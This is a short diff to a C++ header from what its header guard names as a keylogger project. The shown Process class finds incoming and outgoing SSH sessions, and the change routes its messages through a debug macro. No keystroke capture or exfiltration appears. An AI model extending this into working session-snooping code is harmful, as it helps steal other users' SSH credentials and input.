@@ -1,6 +1,8 @@
 #ifndef KEYLOGGER_PROCESS_HPP
 #define KEYLOGGER_PROCESS_HPP
 
+#include "config.hpp"
+
 class Process{
 public:
     Process(std::string user, uint16_t pid, std::string cmd, std::string args):
@@ -8,14 +10,14 @@ public:
 
     bool find_sshd() const {
         if (_args.find("pts") != std::string::npos){
-            std::cout << "Incoming ssh connection: PID = " << _pid << std::endl;
+            DEBUG_STDOUT("Incoming ssh connection: PID = " + std::to_string(_pid));
             return true;
         } else return false;
     }
 
     bool find_ssh() const {
         if (_cmd.find("ssh") != std::string::npos){
-            std::cout << "Outgoing ssh connection: PID = " << _pid << std::endl;
+            DEBUG_STDOUT("Outgoing ssh connection: PID = " + std::to_string(_pid));
             return true;
         } else return false;
     }
